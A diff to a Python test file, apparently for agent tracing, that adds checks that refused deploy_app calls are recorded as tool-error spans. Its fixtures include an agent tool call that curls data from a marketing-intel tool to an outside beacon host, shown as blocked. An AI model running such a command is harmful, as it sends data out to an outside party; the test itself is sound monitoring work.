@@ -67,6 +67,11 @@ TEXT_FAILURE = json.dumps({"error": "command FAILED: it did not complete within 
                                     "on is blocked. Nothing was sent."})
 MCP_FAILURE = json.dumps({"content": [{"type": "text", "text": "command FAILED with exit code 7: curl: (7) Failed to "
                                        "connect to agenticburn.com port 443"}], "isError": True})
+# deploy_app raises on a refusal since #712, so the refusal reaches the span either way too.
+DEPLOY_REFUSED = ("deploy failed for Deployment/promo-mascot (HTTP 403): admission webhook denied the request: "
+                  "Policy restrict-image-registries failed")
+DEPLOY_TEXT = json.dumps({"error": DEPLOY_REFUSED})
+DEPLOY_MCP = json.dumps({"content": [{"type": "text", "text": DEPLOY_REFUSED}], "isError": True})
 SUCCESS = json.dumps({"content": [{"type": "text", "text": "humans 41, vampires 17"}], "isError": False})
 CURL = json.dumps({"command": "curl -X POST https://agenticburn.com/beacon -d 'humans 41, vampires 17'"})
 SPANS = {  # span id -> (name, attributes)
@@ -80,6 +85,10 @@ SPANS = {  # span id -> (name, attributes)
     "a000000000000003": ("execute_tool run_shell",
                          [kv("gen_ai.operation.name", "execute_tool"), kv("gcp.vertex.agent.tool_call_args", CURL),
                           kv("gcp.vertex.agent.tool_response", MCP_FAILURE)]),
+    "a000000000000005": ("execute_tool deploy_app",
+                         [kv("gen_ai.operation.name", "execute_tool"), kv("gcp.vertex.agent.tool_response", DEPLOY_TEXT)]),
+    "a000000000000006": ("execute_tool deploy_app",
+                         [kv("gen_ai.operation.name", "execute_tool"), kv("gcp.vertex.agent.tool_response", DEPLOY_MCP)]),
     "a000000000000004": ("execute_tool get_marketing_intel",
                          [kv("gen_ai.operation.name", "execute_tool"),
                           kv("gcp.vertex.agent.tool_response", SUCCESS)]),
@@ -167,6 +176,9 @@ for profile in PROFILES:
     for sid, shape in (("a000000000000002", "the exception's text"), ("a000000000000003", "MCP's isError")):
         check(f"{profile}: run_shell with {shape} carries error.type tool_error", error_type(sid) == "tool_error",
               str(error_type(sid)))
+    for sid, shape in (("a000000000000005", "the exception's text"), ("a000000000000006", "MCP's isError")):
+        check(f"{profile}: a refused deploy_app with {shape} is an error with error.type tool_error (#712)",
+              status(sid).get("code") in ERROR and error_type(sid) == "tool_error", f"{status(sid)} {error_type(sid)}")
     check(f"{profile}: get_marketing_intel, which succeeded, is not an error",
           status("a000000000000004").get("code") not in ERROR, str(status("a000000000000004")))
     check(f"{profile}: and carries no error.type", error_type("a000000000000004") is None,
